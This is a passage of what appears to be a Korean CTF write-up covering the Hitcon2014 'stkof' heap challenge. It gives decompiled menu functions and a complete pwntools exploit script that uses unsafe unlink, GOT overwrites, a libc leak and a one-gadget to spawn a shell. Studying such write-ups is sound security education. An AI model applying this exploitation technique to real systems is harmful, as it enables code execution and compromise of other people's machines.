@@ -880,3 +880,185 @@ uid=1000(bskim)
 ```
 
 그 후엔 똑같이 free_got를 system으로 바꾸고 atoi_got에 sh를 쓰고 2 pointer를 free 해주면 쉘 ! 또 하나의 문제점 이었던거는.. secret 입력할 때 sendline으로 보내버려서 got 덮을 때 계속 에러가 나서 거기서도 시간을 많이 버렸다..(send와 sendline은 진짜 적절하게 잘 써야 함 ㅠ) 그래도 이건 search에 비하면 훠얼씬 수월했다..(메뉴 적은게 체고시다)
+
+<br>
+
+# Hitcon2014-Stkof
+
+unsafe unlink 문제 
+
+```c
+signed __int64 sub_400936()
+{
+  __int64 size; // [rsp+0h] [rbp-80h]
+  char *v2; // [rsp+8h] [rbp-78h]
+  char s; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v4; // [rsp+78h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  fgets(&s, 16, stdin);
+  size = atoll(&s);
+  v2 = (char *)malloc(size);
+  if ( !v2 )
+    return 0xFFFFFFFFLL;
+  ::s[++chunk_count] = v2;
+  printf("%d\n", (unsigned int)chunk_count, size);
+  return 0LL;
+}
+```
+
+malloc 
+
+bss에 count 변수를 출력해주고 chunk pointer를 넣는다.
+
+```c
+signed __int64 sub_4009E8()
+{
+  signed __int64 result; // rax
+  int i; // eax
+  unsigned int v2; // [rsp+8h] [rbp-88h]
+  __int64 n; // [rsp+10h] [rbp-80h]
+  char *ptr; // [rsp+18h] [rbp-78h]
+  char s; // [rsp+20h] [rbp-70h]
+  unsigned __int64 v6; // [rsp+88h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  fgets(&s, 16, stdin);
+  v2 = atol(&s);
+  if ( v2 > 0x100000 )
+    return 0xFFFFFFFFLL;
+  if ( !::s[v2] )
+    return 0xFFFFFFFFLL;
+  fgets(&s, 16, stdin);
+  n = atoll(&s);
+  ptr = ::s[v2];
+  for ( i = fread(ptr, 1uLL, n, stdin); i > 0; i = fread(ptr, 1uLL, n, stdin) )
+  {
+    ptr += i;
+    n -= i;
+  }
+  if ( n )
+    result = 0xFFFFFFFFLL;
+  else
+    result = 0LL;
+  return result;
+}
+```
+
+복잡해보이긴 하는데 그냥 내가 원하는 만큼 할당한 chunk에 입력할 수 있다. (개꿀)
+
+```c
+signed __int64 sub_400B07()
+{
+  unsigned int v1; // [rsp+Ch] [rbp-74h]
+  char s; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  fgets(&s, 16, stdin);
+  v1 = atol(&s);
+  if ( v1 > 0x100000 )
+    return 0xFFFFFFFFLL;
+  if ( !::s[v1] )
+    return 0xFFFFFFFFLL;
+  free(::s[v1]);
+  ::s[v1] = 0LL;
+  return 0LL;
+}
+```
+
+free
+
+bss의 pointer도 지워버린다. 그리고 이 문제 chunk idx는 1 부터 시작
+
+overflow가 갱장히 편하니 바로 unlink 해주고 sleepyholder 처럼 atoi와 free를 이용해서 풀었다.
+
+```python
+from pwn import *
+
+t = process('./stkof')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def alloc(size):
+	s("1")
+	s(str(size))
+
+def input(a,b,c):
+	s("2")
+	s(str(a))
+	#pause()
+	s(str(b))
+	#pause()
+	s(str(c))
+
+def fre(a):
+	s("3")
+	s(str(a))
+
+def maybe_print(a):
+	s("4")
+	s(str(a))
+
+atoi_got = 0x602080
+puts_plt = 0x0000000000400760
+puts_got = 0x602020
+free_got = 0x602018
+
+alloc(0x100) # Dummy chunk(Not setvbuf)
+alloc(0x100)
+alloc(0x100)
+
+p = p64(0) + p64(0x100) + p64(0x602150-0x18) + p64(0x602150-0x10) + "a"*(0x100-0x20) + p64(0x100) + p64(0x110)
+
+input(2,len(p),p)
+fre(3)
+r("OK")
+
+p = p64(0)*3 + p64(atoi_got) + p64(free_got) + p64(atoi_got)
+
+input(2,len(p),p)
+input(3,8,p64(puts_plt))
+fre(2)
+r("FAIL")
+r("FAIL")
+r("FAIL\n")
+
+libc = u64(t.recv(6).ljust(8,'\x00')) - 0x36ea0
+log.success("libc ==> " + hex(libc))
+one = libc + 0xf02a4
+
+input(3,8,p64(one))
+fre(4)
+
+pause()
+
+t.interactive()
+```
+
+풀고 이거 쓸 때 다시 봤는데
+
+```c
+signed __int64 sub_400BA9()
+{
+  unsigned int v1; // [rsp+Ch] [rbp-74h]
+  char s; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  fgets(&s, 16, stdin);
+  v1 = atol(&s);
+  if ( v1 > 0x100000 )
+    return 0xFFFFFFFFLL;
+  if ( !::s[v1] )
+    return 0xFFFFFFFFLL;
+  if ( strlen(::s[v1]) <= 3 )
+    puts("//TODO");
+  else
+    puts("...");
+  return 0LL;
+}
+```
+
+4번 메뉴가 별게 없어서 그냥 보고 넘어갔는데 strlen(::s[v1]) 이 부분으로 릭하고 익스가 가능해보인다. 괜히 있는건 아니었던 모양이다. 16.04 이하 버전에서 포인터 놀음은 unlink가 참 좋은 것 같음
